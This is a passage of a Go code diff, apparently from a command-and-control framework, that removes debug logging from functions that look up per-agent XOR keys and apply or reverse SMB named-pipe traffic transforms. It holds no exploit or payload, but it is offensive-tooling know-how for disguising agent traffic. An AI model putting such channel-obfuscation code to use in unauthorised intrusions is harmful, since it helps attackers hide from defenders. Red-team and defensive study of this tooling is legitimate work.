 	return profile
 }
 
@@ -1127,7 +1157,6 @@ func (m *Manager) getSMBXorKeyForAgent(linkedClientID string) string {
 		linkedClientID).Scan(&xorKey)
 
 	if err == nil && xorKey.Valid && xorKey.String != "" {
-		log.Printf("[SMBTransform] Using per-agent XOR key for %s (from link_routing)", linkedClientID)
 		return xorKey.String
 	}
 
@@ -1139,11 +1168,9 @@ func (m *Manager) getSMBXorKeyForAgent(linkedClientID string) string {
 		linkedClientID).Scan(&xorKey)
 
 	if err == nil && xorKey.Valid && xorKey.String != "" {
-		log.Printf("[SMBTransform] Using per-agent XOR key for %s (from inits)", linkedClientID)
 		return xorKey.String
 	}
 
-	log.Printf("[SMBTransform] No per-agent XOR key found for %s, using profile default", linkedClientID)
 	return ""
 }
 
@@ -1196,9 +1223,6 @@ func applyPipeTransforms(payload string, profile *config.SMBProfile, xorKeyOverr
 		return nil, 0, 0, fmt.Errorf("failed to apply SMB transforms: %w", err)
 	}
 
-	log.Printf("[SMBTransform] Applied transforms: %d bytes -> %d bytes (prepend=%d, append=%d)",
-		len(envelopeJSON), len(result.Data), result.PrependLength, result.AppendLength)
-
 	return result.Data, result.PrependLength, result.AppendLength, nil
 }
 
@@ -1229,8 +1253,6 @@ func reversePipeTransforms(data []byte, profile *config.SMBProfile, prependLen, 
 	if err != nil {
 		return "", fmt.Errorf("failed to reverse SMB transforms: %w", err)
 	}
-
-	log.Printf("[SMBTransform] Reversed transforms: %d bytes -> %d bytes", len(data), len(reversed))
 
 	// Parse the JSON envelope
 	var envelope struct {
